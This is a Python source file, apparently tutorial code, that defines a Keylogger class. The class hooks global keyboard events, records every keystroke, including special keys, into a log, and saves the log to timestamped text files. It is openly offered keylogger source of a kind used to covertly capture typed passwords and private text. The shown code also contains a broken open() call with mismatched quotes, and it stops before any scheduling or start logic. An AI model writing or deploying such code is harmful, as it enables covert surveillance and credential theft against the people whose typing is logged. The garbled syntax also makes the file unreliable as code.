import os
import keyboard # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

WRITE_REPORT_EVERY = 60 


class Keylogger:
    def __init__(self, interval, report_method = "file"):
        # we gonna pass WRITE_REPORT_EVERY to interval  
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within 'self.interval'
        self.log = ""
        #record start & end datetimes
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g. ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is presses
                name = "[ENTER\n]"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global 'self.log' variable
        self.log += name
        
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_date_string = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
        end_date_string = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_date_string}_{end_date_string}"
        
    def report_to_file(self):
        """This method creates a log file in 
        the current directory that contains the"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt, "w) as f:
            # write the keylogs to the file
            print(self.log, file = f)
        print(f"[+] Saved {self.filename}.txt")
        